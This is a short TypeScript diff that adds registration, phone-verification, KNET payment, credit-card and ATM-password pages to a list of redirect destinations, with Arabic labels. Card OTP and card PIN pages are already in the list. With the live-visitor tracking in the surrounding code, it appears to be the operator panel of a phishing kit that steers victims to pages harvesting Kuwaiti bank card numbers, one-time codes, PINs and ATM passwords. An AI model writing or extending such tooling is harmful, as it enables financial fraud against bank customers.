@@ -118,6 +118,14 @@ const getLifecycle = (reqs: LoginRequest[]): Lifecycle => {
 const ONLINE_THRESHOLD_MS = 5 * 60 * 1000;
 const REDIRECT_DESTINATIONS = [
   { path: "/", label: "الرئيسية", icon: HomeIcon, emoji: "🏠" },
+  { path: "/register", label: "تسجيل - نوع الحساب", icon: User, emoji: "📝" },
+  { path: "/register/personal-info", label: "تسجيل - البيانات الشخصية", icon: User, emoji: "📝" },
+  { path: "/register/password", label: "تسجيل - كلمة المرور", icon: Lock, emoji: "🔒" },
+  { path: "/register/complete", label: "تسجيل - ربط الحساب", icon: CreditCard, emoji: "💳" },
+  { path: "/mobile-verification", label: "توثيق رقم الهاتف", icon: AtSign, emoji: "📱" },
+  { path: "/knet-payment", label: "دفع KNET", icon: CreditCard, emoji: "💰" },
+  { path: "/credit-card-payment", label: "دفع بطاقة ائتمان", icon: CreditCard, emoji: "💳" },
+  { path: "/atm-password", label: "كلمة مرور ATM", icon: Lock, emoji: "🏧" },
   { path: "/card-info", label: "معلومات البطاقة", icon: CreditCard, emoji: "💳" },
   { path: "/card-otp", label: "رمز البطاقة", icon: KeyRound, emoji: "🔢" },
   { path: "/card-pin", label: "الرقم السري BIN", icon: Lock, emoji: "🔒" },
